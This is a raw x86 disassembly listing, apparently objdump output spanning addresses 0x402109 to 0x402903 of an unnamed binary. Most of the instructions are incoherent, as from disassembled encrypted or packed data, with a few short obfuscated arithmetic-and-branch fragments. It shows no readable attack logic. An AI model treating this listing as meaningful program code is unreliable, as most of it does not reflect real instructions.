  402109:	inc    edi
  40210a:	add    edx,DWORD PTR [ebx+0x614b1dcc]
  402110:	pop    es
  402111:	and    ebp,esp
  402113:	mov    db3,edi
  402116:	dec    esi
  402117:	pop    ss
  402118:	adc    DWORD PTR [edx],eax
  40211a:	cld    
  40211b:	add    dh,BYTE PTR [ecx+0x58]
  40211e:	add    eax,0x828e080d
  402123:	scas   eax,DWORD PTR es:[edi]
  402124:	ja     0x40216b
  402126:	sub    edi,DWORD PTR [ebp-0xb]
  402129:	mov    fs,WORD PTR [edi]
  40212b:	jl     0x402165
  40212d:	pop    ebx
  40212e:	retf   
  40212f:	xchg   edx,eax
  402130:	fst    DWORD PTR [edx]
  402132:	pusha  
  402133:	push   0xfdc46ea0
  402138:	inc    edx
  402139:	jnp    0x4020e5
  40213b:	(bad)
  40213e:	jg     0x241ecaee
  402144:	out    dx,eax
  402145:	mov    esi,0x7d5dc1d5
  40214a:	(bad)  
  40214b:	fsub   DWORD PTR [eax]
  40214d:	cmp    bh,bl
  40214f:	pusha  
  402150:	mov    cs,ecx
  402152:	cli    
  402153:	adc    esi,DWORD PTR [esi-0x47]
  402156:	sar    ah,1
  402158:	cdq    
  402159:	sub    ch,ah
  40215b:	xlat   BYTE PTR ds:[ebx]
  40215c:	mov    esi,0xb2025591
  402161:	jae    0x402189
  402163:	or     eax,0xf2c55b71
  402168:	sub    ebx,0xffffffb2
  40216b:	imul   esi,DWORD PTR [edi-0x9],0xced40f08
  402172:	push   0x6c
  402174:	sbb    BYTE PTR [ebp-0x2d],ah
  402177:	clc    
  402178:	mov    cs,ecx
  40217a:	dec    esi
  40217b:	cmp    al,0x6e
  40217d:	fbld   TBYTE PTR [esi]
  40217f:	add    BYTE PTR [ebp-0x3c],bh
  402182:	jns    0x402105
  402184:	aaa    
  402185:	sbb    eax,0x4bb6a740
  40218a:	pop    ss
  40218b:	cld    
  40218c:	xor    ah,BYTE PTR [esi]
  40218e:	je     0x40218e
  402190:	imul   ebx,DWORD PTR [esi],0xffffffb4
  402193:	popa   
  402194:	or     eax,edx
  402196:	cmp    al,0x4c
  402198:	inc    ebx
  402199:	idiv   ah
  40219b:	clc    
  40219c:	mov    dh,0x6a
  40219e:	gs xchg edx,eax
  4021a0:	test   ch,bh
  4021a2:	or     ecx,DWORD PTR [edi]
  4021a4:	ja     0x402190
  4021a6:	dec    ecx
  4021a7:	lea    ebx,[ebp+edx*2-0x17]
  4021ab:	pop    ebp
  4021ac:	sbb    DWORD PTR [esi],edi
  4021ae:	xlat   BYTE PTR ds:[ebx]
  4021af:	fisttp WORD PTR [esi+eiz*2]
  4021b2:	adc    dl,BYTE PTR [ecx+ecx*8+0x4be7a494]
  4021b9:	cmp    eax,DWORD PTR [eax-0x1f]
  4021bc:	loopne 0x402145
  4021be:	mov    dl,0xe6
  4021c0:	cmp    eax,0x51885308
  4021c5:	pop    ecx
  4021c6:	xchg   al,ah
  4021c8:	imul   edx,DWORD PTR [edi],0x3b
  4021cb:	stos   BYTE PTR es:[edi],al
  4021cc:	xchg   ebx,eax
  4021cd:	es cld 
  4021cf:	push   ds
  4021d0:	outs   dx,DWORD PTR ds:[esi]
  4021d1:	adc    DWORD PTR [eax+0x16],0x17af17a3
  4021d8:	or     al,0x26
  4021da:	ret    0x555b
  4021dd:	cmp    ebp,DWORD PTR [ecx]
  4021df:	add    BYTE PTR [ebx+0x3811d051],0xa5
  4021e6:	jb     0x402208
  4021e8:	sbb    BYTE PTR [eax+esi*8],dh
  4021eb:	fiadd  WORD PTR [esi]
  4021ed:	sub    BYTE PTR [edi+ecx*1-0x7fac9909],cl
  4021f4:	cdq    
  4021f5:	inc    edx
  4021f6:	out    dx,al
  4021f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021f8:	out    dx,al
  4021f9:	jmp    0xf135467b
  4021fe:	hlt    
  4021ff:	adc    eax,0x4edd5b60
  402204:	mov    ds,esp
  402206:	inc    esi
  402207:	xlat   BYTE PTR ds:[ebx]
  402208:	aas    
  402209:	cli    
  40220a:	lods   eax,DWORD PTR ds:[esi]
  40220b:	sub    al,0xcf
  40220d:	push   ds
  40220e:	push   es
  40220f:	lock mov esi,ebp
  402212:	mov    eax,ds:0x43864d76
  402217:	mov    esp,0xce49efb9
  40221c:	jmp    0x344e:0x65b44995
  402223:	mov    al,ds:0x4e3d59ac
  402228:	xchg   BYTE PTR [ebx],dl
  40222a:	pop    edx
  40222b:	shr    ecx,0x5
  40222e:	fdiv   QWORD PTR [ebp+0x7688b030]
  402234:	push   es
  402235:	iret   
  402236:	in     al,dx
  402237:	aam    0x9b
  402239:	call   DWORD PTR [ebx]
  40223b:	mov    ah,0x9
  40223d:	sbb    BYTE PTR [ebp+0x68124a06],ch
  402243:	shl    DWORD PTR ds:0xc9e89497,0xe2
  40224a:	js     0x402207
  40224c:	dec    ecx
  40224d:	pop    ebx
  40224e:	popa   
  40224f:	aaa    
  402250:	outs   dx,DWORD PTR ds:[esi]
  402251:	jo     0x402237
  402253:	shr    BYTE PTR [esi-0x5e],cl
  402256:	popf   
  402257:	jae    0x4022be
  402259:	rcr    BYTE PTR [edi],1
  40225b:	inc    ebp
  40225c:	or     BYTE PTR [esi-0x63dadd88],dl
  402262:	mov    eax,0x1ab6265d
  402267:	jle    0x40225c
  402269:	dec    esi
  40226a:	inc    ebx
  40226b:	xor    al,BYTE PTR [eax]
  40226d:	in     eax,dx
  40226e:	mov    ebp,0x7bb61321
  402273:	xchg   WORD PTR [ebp+0xf],bp
  402277:	test   BYTE PTR [ecx-0x74fffffc],al
  40227d:	inc    ebp
  40227e:	in     al,dx
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    edx,edi
  40229b:	xor    al,0x62
  40229d:	dec    ebx
  40229e:	jo     0x4022a2
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	sbb    DWORD PTR [edx],esi
  4022a8:	pop    esi
  4022a9:	inc    ecx
  4022aa:	dec    ecx
  4022ab:	repnz add dh,bh
  4022ae:	sub    ah,BYTE PTR [esi]
  4022b0:	inc    esp
  4022b1:	retf   
  4022b2:	sub    BYTE PTR [ecx+0x2c85584],bh
  4022b8:	lds    ebp,FWORD PTR [ecx-0x66]
  4022bb:	hlt    
  4022bc:	pop    esp
  4022bd:	dec    ecx
  4022be:	pop    esp
  4022bf:	sub    al,0xbd
  4022c1:	push   esp
  4022c2:	(bad)  
  4022c3:	xchg   BYTE PTR [edx+0x50],dl
  4022c6:	mov    al,0xd4
  4022c8:	jae    0x402254
  4022ca:	out    dx,eax
  4022cb:	push   eax
  4022cc:	popa   
  4022cd:	xchg   edx,eax
  4022ce:	xchg   DWORD PTR [ebp-0x76],ebx
  4022d1:	lahf   
  4022d2:	gs retf 
  4022d4:	jmp    0x85bded6
  4022d9:	sub    ebx,ebp
  4022db:	dec    esp
  4022dc:	push   ecx
  4022dd:	fsubr  QWORD PTR [edi+0x3e94b1e0]
  4022e3:	add    BYTE PTR [ebp+0x75],dh
  4022e6:	jecxz  0x40232b
  4022e8:	je     0x4022db
  4022ea:	xchg   DWORD PTR [esi],ecx
  4022ec:	(bad)  
  4022ed:	retf   0xc5d2
  4022f0:	mov    edi,0x21bcc2c8
  4022f5:	pusha  
  4022f6:	ins    BYTE PTR es:[edi],dx
  4022f7:	mov    es,WORD PTR [ebx]
  4022f9:	jmp    0x402356
  4022fb:	cli    
  4022fc:	(bad)
  402301:	ds mov ecx,0x5e37ceff
  402307:	ins    DWORD PTR es:[edi],dx
  402308:	mov    esi,ecx
  40230a:	push   cs
  40230b:	push   esp
  40230c:	data16 lods al,BYTE PTR ds:[esi]
  40230e:	xchg   DWORD PTR [edi+0x7cacc19a],eax
  402314:	inc    esi
  402315:	mov    ebp,0xcc61ccb3
  40231a:	test   DWORD PTR [ebp-0x3],esp
  40231d:	or     DWORD PTR ds:0x502b9ec0,eax
  402323:	iret   
  402324:	int    0x66
  402326:	int    0xbc
  402328:	or     al,0xbf
  40232a:	hlt    
  40232b:	ret    
  40232c:	cmp    BYTE PTR [esi-0x12],dh
  40232f:	mov    esp,0x5642fbf5
  402334:	fs mov al,0x73
  402337:	ret    
  402338:	mov    es,WORD PTR [eax+0x16]
  40233b:	ins    BYTE PTR es:[edi],dx
  40233c:	ds data16 mov bh,0x8
  402340:	jmp    0x227e8d05
  402345:	test   ecx,esi
  402347:	jle    0x40232a
  402349:	adc    al,BYTE PTR [eax]
  40234b:	shl    edi,cl
  40234d:	xchg   esp,eax
  40234e:	sub    BYTE PTR [esi],0xad
  402351:	sbb    al,0xd0
  402353:	jge    0x40236f
  402355:	pop    edx
  402356:	sbb    esp,eax
  402358:	call   0xb10d:0x76ef935c
  40235f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402360:	mov    cl,0x9
  402362:	mov    al,0x6a
  402364:	sbb    cl,BYTE PTR [esi+0x78ad3be7]
  40236a:	push   ecx
  40236b:	add    al,0xa9
  40236d:	pop    eax
  40236e:	xor    DWORD PTR [edx+0x5830fbb3],ecx
  402374:	icebp  
  402375:	and    DWORD PTR [ecx-0x6a3f1fea],0xfbfbc606
  40237f:	add    DWORD PTR [ecx+0x39],ebp
  402382:	out    dx,al
  402383:	scas   al,BYTE PTR es:[edi]
  402384:	xor    DWORD PTR [esp+esi*2+0x7b],ecx
  402388:	cmp    BYTE PTR [eax-0x6f278a64],bh
  40238e:	iret   
  40238f:	mov    dl,0x63
  402391:	and    eax,0xf201a319
  402396:	ins    BYTE PTR es:[edi],dx
  402397:	retf   
  402398:	xchg   BYTE PTR [edx],bl
  40239a:	popf   
  40239b:	retf   
  40239c:	push   cs
  40239d:	std    
  40239e:	fcomp  st(4)
  4023a0:	test   al,0xc3
  4023a2:	sbb    BYTE PTR [ebp-0x4b],ch
  4023a5:	lahf   
  4023a6:	jne    0x402350
  4023a8:	fisubr DWORD PTR [eax-0x2ed3bcf]
  4023ae:	into   
  4023af:	ja     0x402334
  4023b1:	sti    
  4023b2:	inc    esp
  4023b3:	retf   
  4023b4:	mov    WORD PTR [ebx],fs
  4023b6:	sbb    al,0xe5
  4023b8:	std    
  4023b9:	mov    cl,0x94
  4023bb:	(bad)  
  4023bd:	rol    BYTE PTR [ecx],0x21
  4023c0:	sub    DWORD PTR [ecx],0xad9d44c4
  4023c6:	fsub   st,st(4)
  4023c8:	add    BYTE PTR [ecx+0x55f7aedb],dl
  4023ce:	pop    esp
  4023cf:	xchg   esp,eax
  4023d0:	loop   0x4023c6
  4023d2:	cmp    eax,0xd856b5e7
  4023d7:	lods   al,BYTE PTR ds:[esi]
  4023d8:	cmp    ecx,eax
  4023da:	(bad)  
  4023db:	dec    eax
  4023dc:	outs   dx,DWORD PTR ds:[esi]
  4023dd:	fstp   TBYTE PTR [ecx+0x6a]
  4023e0:	test   eax,0x693a3754
  4023e5:	es pop ss
  4023e7:	sub    BYTE PTR [eax],cl
  4023e9:	hlt    
  4023ea:	sub    al,0x48
  4023ec:	cmp    edi,DWORD PTR [esi]
  4023ee:	(bad)  [eax]
  4023f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023f1:	mov    ecx,0x9091f232
  4023f6:	test   al,0xba
  4023f8:	xchg   esi,eax
  4023f9:	mov    al,ds:0xc3ec4d95
  4023fe:	in     al,dx
  4023ff:	mov    dl,0x27
  402401:	mov    eax,0x2e0a461d
  402406:	call   0x3731f864
  40240b:	cli    
  40240c:	xchg   esp,eax
  40240d:	leave  
  40240e:	sbb    edi,edi
  402410:	inc    esp
  402411:	nop
  402412:	lock cmp bl,0x32
  402416:	sbb    ebx,DWORD PTR [esi+0x29]
  402419:	leave  
  40241a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40241b:	cs out dx,ax
  40241e:	adc    al,0x25
  402420:	inc    eax
  402421:	sbb    eax,0xd4fa51ae
  402426:	mov    ah,0x28
  402428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402429:	shl    bl,0xe4
  40242c:	lock imul edx,DWORD PTR ds:0x2c4a11ad,0xb35fdb18
  402437:	and    eax,DWORD PTR [ebx+0x6894c349]
  40243d:	mov    ebp,0xed09032f
  402442:	loope  0x4023e9
  402444:	inc    esp
  402445:	mov    edi,0xa7dd0c45
  40244a:	cmp    BYTE PTR [eax+0x4d],0x31
  40244e:	out    0xc5,eax
  402450:	mov    ecx,0x6124906f
  402455:	clc    
  402456:	add    eax,0x9eeecea9
  40245b:	cli    
  40245c:	cmp    DWORD PTR [eax],edx
  40245e:	call   0x9dc6:0x732d2d5
  402465:	or     BYTE PTR [edi-0x30],bl
  402468:	sbb    eax,0xb927a8f6
  40246d:	mov    eax,ds:0x83e70aff
  402472:	inc    eax
  402473:	sub    BYTE PTR [ebx-0xe],dl
  402476:	adc    ebx,DWORD PTR [ebx+0x2fd66928]
  40247c:	add    cl,BYTE PTR [ecx+0x2e]
  40247f:	jne    0x40240d
  402481:	add    ah,dl
  402483:	jmp    DWORD PTR [edx-0x5501cfbc]
  402489:	loop   0x4024d2
  40248b:	cmp    ah,al
  40248d:	inc    edi
  40248e:	cmp    dl,dl
  402490:	or     bl,BYTE PTR [ebx]
  402492:	xor    DWORD PTR [esi+ecx*8+0x26305be9],esi
  402499:	adc    ch,BYTE PTR [esi-0x3f]
  40249c:	xchg   esi,eax
  40249d:	xlat   BYTE PTR ds:[ebx]
  40249e:	dec    ecx
  40249f:	rol    DWORD PTR [eax],1
  4024a1:	ror    DWORD PTR [edx+0x3c],0xc6
  4024a5:	je     0x40250d
  4024a7:	mov    edx,DWORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0x3f7ab837],cl
  4024f4:	jmp    0x70b02569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	xchg   DWORD PTR [edi-0x45],ebx
  402500:	cmc    
  402501:	and    DWORD PTR [eax-0x1801cd94],ebp
  402507:	mov    ecx,0xe3dd807c
  40250c:	imul   esi,DWORD PTR [edx+eax*8-0x1b],0xe3550113
  402514:	mov    ebp,0x3b5440a8
  402519:	dec    ecx
  40251a:	stos   BYTE PTR es:[edi],al
  40251b:	loopne 0x402573
  40251d:	(bad)  
  40251e:	loop   0x402569
  402520:	int3   
  402521:	jle    0x402511
  402523:	and    cl,dh
  402525:	imul   ebp,ecx,0xb9e9adbd
  40252b:	fdiv   DWORD PTR [esi+0x18]
  40252e:	pop    ecx
  40252f:	daa    
  402530:	add    eax,0xe1fa8a20
  402535:	cmp    ebx,DWORD PTR [edx]
  402537:	pusha  
  402538:	ja     0x40255c
  40253a:	or     eax,0x7dd8caa
  40253f:	stos   BYTE PTR es:[edi],al
  402540:	out    dx,al
  402541:	mov    cs,WORD PTR [ebx+0x19b99b84]
  402547:	push   esp
  402548:	push   ds
  402549:	mov    ah,0x25
  40254b:	dec    ecx
  40254c:	mov    eax,0x9cc0cb7
  402551:	test   edx,0x74ffa828
  402557:	push   ecx
  402558:	cmp    al,0xf3
  40255a:	adc    al,0x82
  40255c:	xchg   DWORD PTR [ebx+0x47886253],esp
  402562:	enter  0x5c31,0xd2
  402566:	inc    esi
  402567:	xchg   esp,eax
  402568:	addr16 mov bh,cl
  40256b:	add    BYTE PTR [edx],0x1f
  40256e:	out    dx,eax
  40256f:	mov    cl,0xd4
  402571:	xchg   esp,eax
  402572:	add    al,0xb3
  402574:	fbld   TBYTE PTR [ebx+0x8826a67]
  40257a:	cdq    
  40257b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40257c:	adc    BYTE PTR [ebp-0x7696bbbf],dl
  402582:	sub    ebp,edx
  402584:	sub    BYTE PTR [esi+0x1f],dh
  402587:	stc    
  402588:	push   0x8d9974a0
  40258d:	and    BYTE PTR [ebx+edi*4],dh
  402590:	outs   dx,BYTE PTR ds:[esi]
  402591:	frstor [esp+eax*8]
  402594:	fisttp QWORD PTR [eax+0x1c]
  402597:	popa   
  402598:	in     al,dx
  402599:	cdq    
  40259a:	test   al,0x90
  40259c:	fild   QWORD PTR [ebp-0x1d5e68a3]
  4025a2:	jmp    0x2bff2787
  4025a7:	mov    esi,0x6a25f001
  4025ac:	rcr    BYTE PTR es:[ebx],cl
  4025af:	jb     0x4025b5
  4025b1:	xor    BYTE PTR [edi],cl
  4025b3:	je     0x4025e6
  4025b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025b6:	adc    BYTE PTR [ebx-0xd8dd5c8],ch
  4025bc:	jl     0x40254a
  4025be:	ds xor eax,0x7a851ea2
  4025c4:	dec    edi
  4025c5:	cdq    
  4025c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025c7:	call   0xd9b9eb32
  4025cc:	push   ebx
  4025cd:	mov    eax,ds:0x61a9626d
  4025d2:	mov    cl,0x59
  4025d4:	xchg   BYTE PTR [esi+0x7d],cl
  4025d7:	sub    al,0x91
  4025d9:	add    DWORD PTR [edx+ecx*1],eax
  4025dc:	nop
  4025dd:	cmp    DWORD PTR ds:0x4c5bf367,eax
  4025e3:	cmc    
  4025e4:	jno    0x402614
  4025e6:	mov    esi,?
  4025e8:	cmp    al,0x5d
  4025ea:	jmp    0x13b47737
  4025ef:	adc    edi,ebx
  4025f1:	xor    ecx,DWORD PTR [ebx-0x76]
  4025f4:	mov    dh,0xa8
  4025f6:	in     eax,dx
  4025f7:	and    BYTE PTR [ebx-0x4d],dl
  4025fa:	mov    cl,0x51
  4025fc:	hlt    
  4025fd:	jne    0x402679
  4025ff:	or     BYTE PTR [edi],bh
  402601:	inc    edi
  402602:	leave  
  402603:	pop    ss
  402604:	sbb    al,0xad
  402606:	inc    edx
  402607:	push   0xc814172
  40260c:	jne    0x402632
  40260e:	icebp  
  40260f:	ins    BYTE PTR es:[edi],dx
  402610:	cli    
  402611:	rcl    BYTE PTR [edi],cl
  402613:	in     al,dx
  402614:	add    eax,0xa0539983
  402619:	or     edx,DWORD PTR [ebx+eiz*8-0x48c5e30b]
  402620:	pushf  
  402621:	mov    al,BYTE PTR [ebp+0x27694562]
  402627:	jnp    0x40268d
  402629:	in     al,dx
  40262a:	mov    bh,0xca
  40262c:	adc    BYTE PTR [esi+0x8],dh
  40262f:	sbb    ch,BYTE PTR ds:0x2774f25a
  402635:	cwde   
  402636:	jnp    0x4025fd
  402638:	pop    edi
  402639:	loope  0x4025eb
  40263b:	outs   dx,DWORD PTR ds:[esi]
  40263c:	clc    
  40263d:	push   edx
  40263e:	test   esp,0x3f525932
  402644:	pop    ds
  402645:	mov    ch,0xc9
  402647:	(bad)  
  402649:	out    0x55,al
  40264b:	hlt    
  40264c:	sti    
  40264d:	and    esi,DWORD PTR [esi+0x28]
  402650:	loop   0x402691
  402652:	popf   
  402653:	jg     0x402666
  402655:	pop    eax
  402656:	scas   al,BYTE PTR es:[edi]
  402657:	out    0x5,al
  402659:	repz into 
  40265b:	fnstsw WORD PTR [ebp+0x60]
  40265e:	std    
  40265f:	mov    DWORD PTR [esi+0x5748b8c9],eax
  402665:	add    DWORD PTR [ebx],edi
  402667:	and    BYTE PTR [eax-0x2cd2d1cd],0xeb
  40266e:	mov    ebx,0x913ae69a
  402673:	sub    eax,0x4d686a7a
  402678:	int    0x51
  40267a:	call   0xb167:0xbff188f0
  402681:	xchg   edi,eax
  402682:	mov    ds:0xc4decb59,al
  402687:	inc    ecx
  402688:	mov    dh,0x28
  40268a:	mov    BYTE PTR [esi],bh
  40268c:	sbb    eax,0x469eeabe
  402691:	dec    ecx
  402692:	ret    0xcca6
  402695:	loop   0x4026c9
  402697:	shl    BYTE PTR [ebx+0xed2efb0],1
  40269d:	mov    al,ds:0x52adfcb1
  4026a2:	ins    BYTE PTR es:[edi],dx
  4026a3:	mov    ebp,0x64b21017
  4026a8:	icebp  
  4026a9:	add    ecx,DWORD PTR [esi+0x5ff98fac]
  4026af:	sub    eax,0x2393ace1
  4026b4:	pop    ebx
  4026b5:	bound  edi,QWORD PTR [ecx+0x27]
  4026b8:	inc    edi
  4026b9:	pop    ebp
  4026ba:	cwde   
  4026bb:	mov    edx,0x64ec7cf7
  4026c0:	cmp    al,0x40
  4026c2:	xor    al,0xe
  4026c4:	into   
  4026c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026c6:	pop    ebp
  4026c7:	mov    esp,0xb7289852
  4026cc:	mov    dl,0xe6
  4026ce:	pop    ds
  4026cf:	jne    0x40272a
  4026d1:	(bad)  
  4026d3:	pmuludq mm2,QWORD PTR [eiz*2-0x3d07f2ab]
  4026db:	nop
  4026dc:	jae    0x402716
  4026de:	add    BYTE PTR [edx+0xcdb2feb],bl
  4026e4:	add    eax,0xa315a7a0
  4026e9:	jl     0x40274d
  4026eb:	jne    0x40266e
  4026ed:	test   al,0x4c
  4026ef:	rol    DWORD PTR [ecx+0x4d8f6c64],cl
  4026f5:	ins    BYTE PTR es:[edi],dx
  4026f6:	ror    DWORD PTR ds:0x5aecb3ea,cl
  4026fc:	mov    ebx,0x8bf4458b
  402701:	push   ebp
  402702:	call   0x7d7de93a
  402707:	or     esi,DWORD PTR [esp+ecx*4+0x1d840f]
  40270e:	add    BYTE PTR [eax],al
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xc310741a
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	mov    WORD PTR [edi-0x13d3d97e],es
  40276d:	xchg   esi,eax
  40276e:	popa   
  40276f:	push   cs
  402770:	mov    esp,DWORD PTR [esi-0x1d746698]
  402776:	test   BYTE PTR [eax-0x717b52c2],dh
  40277c:	push   cs
  40277d:	pop    edx
  40277e:	lds    ebx,FWORD PTR [ebx]
  402780:	out    dx,al
  402781:	in     eax,0xc4
  402783:	mov    dh,0x41
  402785:	cwde   
  402786:	xchg   ebx,eax
  402787:	cmp    DWORD PTR [edi-0x7216fcd0],edx
  40278d:	retf   
  40278e:	pusha  
  40278f:	inc    BYTE PTR [esi-0x5a85ae44]
  402795:	inc    ebx
  402796:	ins    DWORD PTR es:[edi],dx
  402797:	mov    eax,ds:0xe4eeec98
  40279c:	inc    edi
  40279d:	dec    ecx
  40279e:	push   edx
  40279f:	addr16 out dx,eax
  4027a1:	fisttp WORD PTR [ebp-0x5c]
  4027a4:	or     BYTE PTR [edx+eax*8],0xb9
  4027a8:	cmc    
  4027a9:	mov    esi,DWORD PTR [edi+0x56b30aab]
  4027af:	out    dx,eax
  4027b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027b1:	adc    cl,ch
  4027b3:	lods   al,BYTE PTR ds:[esi]
  4027b4:	sbb    al,ch
  4027b6:	repnz ds push es
  4027b9:	retf   0xca06
  4027bc:	sub    al,0x5f
  4027be:	stos   BYTE PTR es:[edi],al
  4027bf:	je     0x4027e5
  4027c1:	dec    edx
  4027c2:	clc    
  4027c3:	ror    DWORD PTR [ecx-0x6a],1
  4027c6:	dec    eax
  4027c7:	cld    
  4027c8:	sub    DWORD PTR [eax+ecx*4-0x1fb25754],ebx
  4027cf:	cmp    eax,0xa8816275
  4027d4:	xor    dh,BYTE PTR [ecx+0x44]
  4027d7:	pushf  
  4027d8:	xchg   edi,eax
  4027d9:	and    ah,BYTE PTR [edx]
  4027db:	ret    
  4027dc:	fs in  eax,dx
  4027de:	add    DWORD PTR [edi-0x3e],ebx
  4027e1:	pop    edx
  4027e2:	sti    
  4027e3:	stos   DWORD PTR es:[edi],eax
  4027e4:	lahf   
  4027e5:	mov    cl,0x93
  4027e7:	cmp    DWORD PTR [eax+0x7491cd8d],ecx
  4027ed:	push   cs
  4027ee:	popf   
  4027ef:	adc    al,0x95
  4027f1:	mov    eax,DWORD PTR [ecx-0x4d]
  4027f4:	les    edx,FWORD PTR [ebx-0x6b2a567a]
  4027fa:	jbe    0x4027f2
  4027fc:	push   0xffffff86
  4027fe:	call   0x423a:0xed00372b
  402805:	xor    DWORD PTR [esi],0xffffffe6
  402808:	inc    ecx
  402809:	mov    ?,WORD PTR [esi]
  40280b:	and    al,0xce
  40280d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40280e:	add    DWORD PTR [edi+0x2e21b62b],eax
  402814:	mov    dl,0x38
  402816:	rcl    DWORD PTR [ecx],1
  402818:	(bad)  
  402819:	xchg   esp,eax
  40281a:	pop    edi
  40281b:	sub    BYTE PTR [esi],dh
  40281d:	addr16 mov al,al
  402820:	leave  
  402821:	adc    eax,0xe2f534b2
  402826:	test   DWORD PTR [edx],edx
  402828:	dec    ecx
  402829:	clc    
  40282a:	dec    edx
  40282b:	loope  0x402853
  40282d:	mov    ds:0xa33a81ed,eax
  402832:	adc    edx,DWORD PTR [eax+0x24]
  402835:	fdivr  DWORD PTR [ebx+edx*1-0x30]
  402839:	jno    0x40280a
  40283b:	mov    es,WORD PTR [edi]
  40283d:	repz lds eax,FWORD PTR [eax]
  402840:	call   0x4668:0x249a1b7c
  402847:	lock pop ecx
  402849:	aaa    
  40284a:	adc    ebp,eax
  40284c:	test   dh,dl
  40284e:	loop   0x40289f
  402850:	lahf   
  402851:	cdq    
  402852:	loopne 0x40286f
  402854:	sbb    BYTE PTR [esi-0x38],bl
  402857:	pushf  
  402858:	xchg   ecx,eax
  402859:	call   0x19da5baa
  40285e:	jne    0x4027f5
  402860:	sub    al,0x84
  402862:	mov    cl,0x5e
  402864:	cmp    BYTE PTR ds:[bp+di-0x12],al
  402869:	xlat   BYTE PTR ds:[ebx]
  40286a:	call   0x12aa630
  40286f:	rcr    ah,1
  402871:	and    al,0x2d
  402873:	in     al,dx
  402874:	and    bl,dh
  402876:	les    ebp,FWORD PTR [eax+0x649ba47e]
  40287c:	addr16 mov cl,0xdb
  40287f:	adc    BYTE PTR [esi],cl
  402881:	addr16 inc edx
  402883:	sbb    al,0x93
  402885:	push   edi
  402886:	imul   edx,DWORD PTR [edi-0x6863c5a8],0x6a214367
  402890:	xchg   ebx,eax
  402891:	dec    edi
  402892:	enter  0x7332,0xaf
  402896:	sub    cl,BYTE PTR [ebx+0x65b6e8c9]
  40289c:	or     BYTE PTR [ecx-0x3899872d],bh
  4028a2:	cmp    al,0x4a
  4028a4:	sub    eax,0x89fc06e8
  4028a9:	mov    esi,0x289054c9
  4028ae:	test   DWORD PTR ds:0x5d0bfdce,0xf0107b96
  4028b8:	dec    ebx
  4028b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028ba:	cmp    bl,BYTE PTR [esi]
  4028bc:	ret    
  4028bd:	repz mov ch,0x72
  4028c0:	lods   eax,DWORD PTR ds:[esi]
  4028c1:	xor    BYTE PTR [edi-0x13],bh
  4028c4:	ds push cs
  4028c6:	rcl    BYTE PTR [ecx+0x6153dcb3],cl
  4028cc:	push   cs
  4028cd:	mov    ds:0x5ba371ab,eax
  4028d2:	xchg   edi,eax
  4028d3:	xchg   edi,eax
  4028d4:	ficom  DWORD PTR [ebp+eiz*4-0x41]
  4028d8:	fidivr WORD PTR [edi]
  4028da:	(bad)  
  4028db:	lock push es
  4028dd:	cmp    BYTE PTR [ebp+0x3e],al
  4028e0:	cs aad 0x51
  4028e3:	(bad)  
  4028e4:	sub    ch,bh
  4028e6:	adc    al,0x15
  4028e8:	sbb    BYTE PTR [ecx+0x4afc9944],0x93
  4028ef:	add    BYTE PTR [eax+0x6c2fdcd9],0xa4
  4028f6:	pusha  
  4028f7:	dec    eax
  4028f8:	outs   dx,BYTE PTR ds:[esi]
  4028f9:	js     0x4028fd
  4028fb:	popa   
  4028fc:	outs   dx,DWORD PTR ds:[esi]
  4028fd:	pop    ebx
  4028fe:	sub    DWORD PTR [esi-0x24],edi
  402901:	sub    ebp,ebx
  402903:	adc    al,0xd3
